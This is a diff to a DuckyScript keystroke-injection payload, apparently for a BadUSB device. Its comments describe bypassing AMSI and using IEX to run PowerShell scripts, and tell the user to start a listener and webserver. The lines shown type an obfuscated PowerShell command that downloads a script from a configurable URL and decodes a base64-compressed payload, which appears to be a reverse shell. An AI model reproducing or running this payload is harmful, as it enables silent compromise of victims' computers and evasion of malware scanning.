@@ -4,7 +4,7 @@ REM       OS: Windows / Linux(?) (Not tested with Powershell on Linux)
 REM       Author: 0iphor13
 
 REM       AMSI bypass and using of IEX to execute powershell scripts.
-REM       Fill in URL at line []
+REM       Fill in URL at line 18
 REM       DON'T FORGET TO START LISTENER & WEBSERVER
 
 DELAY 1500
@@ -15,7 +15,7 @@ DELAY 250
 ENTER
 
 DELAY 100
-STRING $URL='http://192.168.178.25:8080/Invoke-Powershellshell.ps1'; ( NEW-o
+STRING $URL='http://0.0.0.0:8080/Invoke-Script.ps1'; ( NEW-o
 DELAY 200
 STRING bJEcT sySTEM.io.CoMPrESSIOn.DeFLaTEsTREAM( [io.mEMorYSTReAm] [conVeRt]::FrOMbaSE64STring( 'pY3bSsNAEIZfpYSV7tp0yW4Os6H0
 DELAY 200
